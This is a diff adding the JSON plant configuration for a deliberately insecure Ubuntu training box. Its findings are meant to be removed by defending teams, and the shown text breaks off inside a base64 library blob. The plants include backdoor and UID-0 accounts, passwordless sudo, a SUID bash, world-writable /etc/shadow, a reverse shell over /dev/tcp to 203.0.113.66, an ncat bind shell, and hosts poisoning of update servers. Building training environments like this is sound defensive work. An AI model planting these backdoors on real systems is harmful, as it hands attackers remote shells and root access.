@@ -1,0 +1,500 @@
+{
+  "_comment": "Vermilion Deep-Space Relay plants (GUI Xubuntu capstone). The box's LEGITIMATE furniture -- the relayadmin operator account (sudo, ~/Desktop, greeter tile; also boxbuilder's ssh login), the apache2+PHP+MariaDB relay-telemetry web app under /var/www/relay with a real config.php (0640) and /usr/local/sbin/relay-telemetry, and the nmap /usr/bin/ncat the ncat-listener-autostart unit hardcodes -- is baked in during TEMPLATE PREP, not here. This config plants only the insecure/attacker material: 80 scored findings + 8 forensics breadcrumbs, each paired with a check in boxes/vermilion-relay/scenario.yaml (asserted by tests/unit/test_boxbuilder_vermilion_relay.py). ORDERING: every account/shell plant (user-login-shell, uid0-user, local-user, dup-uid) runs BEFORE loosen-file-mode on /etc/shadow and /etc/passwd, because useradd/usermod/chpasswd reset those modes on the way out (the coral 149 lesson). COUPLINGS (must match scenario.yaml collect params byte-for-byte; nothing cross-checks them): raw-socket-beacon BEACON_PATH=/opt/telemetry-uplink/uplink-relayd (baked-in C2 203.0.113.66:8443, no listening port) <-> beacon_process_gone/beacon_service_disabled/beacon_binary_removed + fq-beacon-destination; ncat-listener-autostart (catalog row: unit system-update.service, ncat -l -k -p 4444 -e /bin/bash, enable-only -- the build loop must `systemctl start system-update.service` after plant) <-> bind_shell_removed + fq-bind-shell-port; suid-binary DEST <-> no_suid_backdoor + fq-suid-backdoor; systemd-timer-persistence relay-resync <-> persistence_timer_gone + fq-persistence-timer; ld-preload-persistence LIB_PATH <-> ld_preload_gone + fq-ldpreload-lib; hosts-redirect-linux IP <-> hosts_no_redirect + fq-hosts-redirect; uid0-user nightwatch <-> no_uid0_user + fq-hidden-root; local-user vega GROUPS_ADD=sudo <-> no_vega/sudo_group_clean + fq-sudo-account. relaydash is a decoy account (unauthorized, unscored on its own) that carries the hidden crontab, the user-level systemd unit + linger, an authorized_keys, and the .rhosts. relayops shares relaybot's UID (dup-uid). All plants must stay IN PLACE at seal: the paired checks score their ABSENCE/hardened state. The apt-service-install rows (telnet/rsh/tftp/cups) and vsftpd/samba/nfs need package access at plant time -- verify each listener/config is live at the 0-score baseline during the deploy loop; swap any that will not come up. ORDERING NOTE: hosts-redirect-linux MUST be LAST -- it poisons archive/security.ubuntu.com to an unroutable IP, which breaks apt for any plant that installs packages (telnet/rsh/tftp/vsftpd/samba/nfs and the cron/at package deps). Planting it last keeps apt working during the build; on the sealed box the poison is a finding teams fix.",
+  "machines": [
+    {
+      "id": 1,
+      "name": "vermilion-01",
+      "ip": "REPLACED-BY-PROVIDER",
+      "os": "ubuntu-xfce",
+      "user": "REPLACED-BY-PROVIDER",
+      "password": "REPLACED-BY-PROVIDER",
+      "configurations": [
+        {
+          "name": "user-login-shell",
+          "vars": {
+            "USERNAME": "relaybot",
+            "LOGIN_SHELL": "/bin/bash",
+            "SYSTEM": "1"
+          }
+        },
+        {
+          "name": "user-login-shell",
+          "vars": {
+            "USERNAME": "uplinkd",
+            "LOGIN_SHELL": "/bin/bash",
+            "SYSTEM": "1"
+          }
+        },
+        {
+          "name": "uid0-user",
+          "vars": {
+            "USERNAME": "nightwatch",
+            "PASSWORD": "Vermilion2026!"
+          }
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "vega",
+            "PASSWORD": "Nebula7!",
+            "GROUPS_ADD": "sudo"
+          }
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "orion",
+            "PASSWORD": "Comet3!",
+            "GROUPS_ADD": "shadow"
+          }
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "lyra",
+            "PASSWORD": ""
+          }
+        },
+        {
+          "name": "local-user",
+          "vars": {
+            "USERNAME": "relaydash",
+            "PASSWORD": "Dash9!"
+          }
+        },
+        {
+          "name": "dup-uid",
+          "vars": {
+            "USERNAME": "relayops",
+            "CLONE_OF": "relaybot"
+          }
+        },
+        {
+          "name": "weak-login-defs",
+          "vars": {
+            "PASS_MAX_DAYS": "99999",
+            "ENCRYPT_METHOD": "MD5"
+          }
+        },
+        {
+          "name": "pam-permit-auth",
+          "vars": {
+            "PAM_FILE": "/etc/pam.d/common-auth"
+          }
+        },
+        {
+          "name": "user-sudo-nopasswd",
+          "vars": {
+            "USERNAME": "vega",
+            "DROPIN_NAME": "99-void"
+          }
+        },
+        {
+          "name": "sudoers-rule",
+          "vars": {
+            "DROPIN_NAME": "10-relay",
+            "RULE": "relayadmin ALL=(ALL) NOPASSWD: /usr/bin/vim"
+          }
+        },
+        {
+          "name": "sudoers-rule",
+          "vars": {
+            "DROPIN_NAME": "00-relay-defaults",
+            "RULE": "Defaults !authenticate"
+          }
+        },
+        {
+          "name": "loosen-file-mode",
+          "vars": {
+            "FILE_PATH": "/etc/shadow",
+            "FILE_MODE": "0666"
+          }
+        },
+        {
+          "name": "loosen-file-mode",
+          "vars": {
+            "FILE_PATH": "/etc/passwd",
+            "FILE_MODE": "0666"
+          }
+        },
+        "sshd-config-weak",
+        {
+          "name": "authorized-keys-persistence",
+          "vars": {
+            "USERNAME": "relayadmin",
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL0voidRELAYc2tKQvoidPERSISTvoidBACKD00Rkey00 voidkey@relay"
+          }
+        },
+        {
+          "name": "authorized-keys-persistence",
+          "vars": {
+            "USERNAME": "uplinkd",
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL0voidRELAYc2tKQvoidPERSISTvoidBACKD00Rkey00 voidkey@relay"
+          }
+        },
+        {
+          "name": "authorized-keys-persistence",
+          "vars": {
+            "USERNAME": "relaydash",
+            "PUBLIC_KEY": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL0voidRELAYc2tKQvoidPERSISTvoidBACKD00Rkey00 voidkey@relay"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/home/relayadmin/.ssh/id_ed25519",
+            "FILE_MODE": "0644",
+            "FILE_CONTENT": "[training placeholder private key -- not a real key]"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/opt/vermilion/relay-keys.txt",
+            "FILE_MODE": "0666",
+            "FILE_CONTENT": "relay signing key material (training placeholder)"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/opt/vermilion/uplink-credentials.txt",
+            "FILE_MODE": "0644",
+            "FILE_CONTENT": "uplink user: relayops / uplink pass: Vermilion-Uplink-2026"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/etc/cron.d/vermilion-telemetry",
+            "FILE_MODE": "0666",
+            "FILE_CONTENT": "15 * * * * root /usr/local/sbin/relay-telemetry"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/home/relayadmin/Desktop/dish-access-code.txt",
+            "FILE_MODE": "0666",
+            "FILE_CONTENT": "Dish maintenance access code: 7731-VERM"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/var/log/relay/relay.log",
+            "FILE_MODE": "0666",
+            "FILE_CONTENT": "relay telemetry log (training)"
+          }
+        },
+        {
+          "name": "insecure-file-mode",
+          "vars": {
+            "FILE_PATH": "/var/media/relay-broadcast.mp4",
+            "FILE_MODE": "0755",
+            "FILE_CONTENT": "#!/bin/sh"
+          }
+        },
+        {
+          "name": "world-writable-dir",
+          "vars": {
+            "DIR": "/srv/relay-shared",
+            "MODE": "0777"
+          }
+        },
+        {
+          "name": "suid-binary",
+          "vars": {
+            "DEST": "/usr/local/bin/relay-diag",
+            "SRC": "/bin/bash"
+          }
+        },
+        {
+          "name": "world-writable-dir",
+          "vars": {
+            "DIR": "/usr/local/bin",
+            "MODE": "0777"
+          }
+        },
+        {
+          "name": "file-capability",
+          "vars": {
+            "DEST": "/opt/vermilion/pytools/python3"
+          }
+        },
+        {
+          "name": "chown-file",
+          "vars": {
+            "FILE_PATH": "/etc/vermilion/relay.conf",
+            "OWNER": "relaybot",
+            "CONTENT": "relay_id = vermilion-7"
+          }
+        },
+        "sysctl-insecure",
+        {
+          "name": "ufw-insecure",
+          "vars": {
+            "ROGUE_PORT": "31337"
+          }
+        },
+        {
+          "name": "apt-service-install",
+          "vars": {
+            "PACKAGES": "openbsd-inetd telnetd",
+            "UNITS": "openbsd-inetd",
+            "POST": "update-inetd --enable telnet; systemctl restart openbsd-inetd"
+          }
+        },
+        {
+          "name": "apt-service-install",
+          "vars": {
+            "PACKAGES": "openbsd-inetd rsh-server",
+            "UNITS": "openbsd-inetd"
+          }
+        },
+        {
+          "name": "apt-service-install",
+          "vars": {
+            "PACKAGES": "tftpd-hpa",
+            "UNITS": "tftpd-hpa"
+          }
+        },
+        {
+          "name": "apt-service-install",
+          "vars": {
+            "PACKAGES": "cups",
+            "UNITS": "cups"
+          }
+        },
+        "vsftpd-anonymous",
+        {
+          "name": "samba-guest-share",
+          "vars": {
+            "SHARE_NAME": "relay-public",
+            "SHARE_PATH": "/srv/relay-public"
+          }
+        },
+        {
+          "name": "nfs-no-root-squash",
+          "vars": {
+            "EXPORT_PATH": "/srv/relay-share"
+          }
+        },
+        {
+          "name": "apache-insecure",
+          "vars": {
+            "ALIAS_NAME": "vault"
+          }
+        },
+        {
+          "name": "web-exposed-file",
+          "vars": {
+            "WEBROOT": "/var/www/relay"
+          }
+        },
+        "mysql-anon-user",
+        {
+          "name": "loosen-file-mode",
+          "vars": {
+            "FILE_PATH": "/var/www/relay/config.php",
+            "FILE_MODE": "0644"
+          }
+        },
+        {
+          "name": "raw-socket-beacon",
+          "vars": {
+            "SERVICE_NAME": "telemetry-uplink",
+            "BEACON_PATH": "/opt/telemetry-uplink/uplink-relayd",
+            "DESCRIPTION": "Telemetry uplink service"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "voidcaster",
+            "EXEC_START": "/bin/sh /opt/voidcaster/voidcast",
+            "DESCRIPTION": "Void Caster",
+            "PAYLOAD_PATH": "/opt/voidcaster/voidcast",
+            "PAYLOAD_BODY": "while :; do echo voidcast >> /var/log/voidcast.log 2>/dev/null; sleep 300; done",
+            "ENABLE": "1"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "dish-align",
+            "EXEC_START": "/bin/sh /opt/void/dish-align.sh",
+            "DESCRIPTION": "Dish Alignment Helper",
+            "PAYLOAD_PATH": "/opt/void/dish-align.sh",
+            "PAYLOAD_BODY": "while :; do sleep 3600; done",
+            "ENABLE": "1"
+          }
+        },
+        {
+          "name": "systemd-service",
+          "vars": {
+            "SERVICE_NAME": "array-cooling",
+            "EXEC_START": "/bin/sh /usr/local/sbin/array-cool --exfil-to 203.0.113.66:8443",
+            "DESCRIPTION": "Antenna array cooling",
+            "PAYLOAD_PATH": "/usr/local/sbin/array-cool",
+            "PAYLOAD_BODY": "while :; do sleep 3600; done",
+            "ENABLE": "1"
+          }
+        },
+        "ncat-listener-autostart",
+        {
+          "name": "systemd-timer-persistence",
+          "vars": {
+            "TIMER_NAME": "starlight-sync",
+            "EXEC_START": "/opt/void/starlight-sync",
+            "DESCRIPTION": "Starlight sync",
+            "PAYLOAD_PATH": "/opt/void/starlight-sync",
+            "PAYLOAD_BODY": "bash -i >/dev/tcp/203.0.113.66/9001 0>&1 2>&1 || true",
+            "ON_UNIT_ACTIVE_SEC": "10min"
+          }
+        },
+        {
+          "name": "systemd-timer-persistence",
+          "vars": {
+            "TIMER_NAME": "relay-resync",
+            "EXEC_START": "/opt/void/relay-resync",
+            "DESCRIPTION": "Relay resync",
+            "PAYLOAD_PATH": "/opt/void/relay-resync",
+            "PAYLOAD_BODY": "echo resync >> /var/log/relay-resync.log 2>/dev/null || true",
+            "ON_UNIT_ACTIVE_SEC": "15min"
+          }
+        },
+        {
+          "name": "cron-d-persistence",
+          "vars": {
+            "CRON_FILE": "void-sync",
+            "SCHEDULE": "*/10 * * * *",
+            "PAYLOAD_PATH": "/opt/void/void-sync",
+            "PAYLOAD_BODY": "echo void >> /var/log/void.log 2>/dev/null || true"
+          }
+        },
+        {
+          "name": "crontab-persistence",
+          "vars": {
+            "USERNAME": "root",
+            "SCHEDULE": "@reboot",
+            "JOB_COMMAND": "/opt/void/void-sync"
+          }
+        },
+        {
+          "name": "crontab-persistence",
+          "vars": {
+            "USERNAME": "relaydash",
+            "SCHEDULE": "*/30 * * * *",
+            "JOB_COMMAND": "/opt/void/void-sync"
+          }
+        },
+        {
+          "name": "profiled-persistence",
+          "vars": {
+            "FILE_NAME": "zz-void.sh",
+            "SNIPPET": "echo >> /var/log/void-login.log 2>/dev/null || true   # void-beacon"
+          }
+        },
+        {
+          "name": "bashrc-persistence",
+          "vars": {
+            "TARGET_FILE": "/home/relayadmin/.bashrc",
+            "MARKER": "void-beacon",
+            "SNIPPET": ": # void-beacon"
+          }
+        },
+        {
+          "name": "bashrc-persistence",
+          "vars": {
+            "TARGET_FILE": "/etc/bash.bashrc",
+            "MARKER": "void-beacon",
+            "SNIPPET": ": # void-beacon"
+          }
+        },
+        {
+          "name": "motd-persistence",
+          "vars": {
+            "SCRIPT_NAME": "99-void",
+            "SNIPPET": "printf ''   # void"
+          }
+        },
+        {
+          "name": "at-job-persistence",
+          "vars": {
+            "PAYLOAD_PATH": "/opt/void/void-at",
+            "PAYLOAD_BODY": "echo void >> /var/log/void.log 2>/dev/null || true",
+            "WHEN": "now + 3 days"
+          }
+        },
+        {
+          "name": "initd-persistence",
+          "vars": {
+            "SCRIPT_NAME": "voidlink",
+            "PAYLOAD_PATH": "/opt/void/voidlink-payload",
+            "PAYLOAD_BODY": "echo void >> /var/log/void.log 2>/dev/null || true",
+            "DESCRIPTION": "Void link"
+          }
+        },
+        {
+          "name": "rc-local-persistence",
+          "vars": {
+            "RC_LINE": "/opt/void/void-sync &",
+            "MARKER": "void",
+            "PAYLOAD_PATH": "/opt/void/void-sync",
+            "PAYLOAD_BODY": "echo void >> /var/log/void.log 2>/dev/null || true"
+          }
+        },
+        {
+          "name": "ld-preload-persistence",
+          "vars": {
+            "LIB_PATH": "/opt/void/libvoidhook.so",
+            "SO_B64": "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAAFAhAAAAAAAAAAAAAEAAOAAIAEAADQAMAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoBAAAAAAAACgEAAAAAAAAAAQAAAAAAAAAQAAAAYAAABQHwAAAAAAAFAvAAAAAAAAUC8AAAAAAACwAAAAAAAAALgAAAAAAAAAABAAAAAAAAACAAAABgAAAFAfAAAAAAAAUC8AAAAAAABQLwAAAAAAALAAAAAAAAAAsAAAAAAAAAAIAAAAAAAAAAQAAAAEAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAABAAAAAQAAABwEAAAAAAAAHAQAAAAAAAAcBAAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAABT5XRkBAAAAHAQAAAAAAAAcBAAAAAAAABwEAAAAAAAADAAAAAAAAAAMAAAAAAAAAAIAAAAAAAAAFHldGQGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAUuV0ZAQAAABQHwAAAAAAAFAvAAAAAAAAUC8AAAAAAACwAAAAAAAAALAAAAAAAAAAAQAAAAAAAAAEAAAAFAAAAAMAAABHTlUAqhoCnEEkk8tLU1uDoyjYONJGPXEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAQAAAAYAAAAAEAACAAAAAAEAAAAAAAAATYaalwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEQAIAAAwAAAAAAAABAAAAAAAAAAAbmlnaHRjYXN0X3BsYWNlaG9sZGVyAAAEAAAAIAAAAAUAAABHTlUAAQABwAQAAAABAAAAAAAAAAIAAcAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA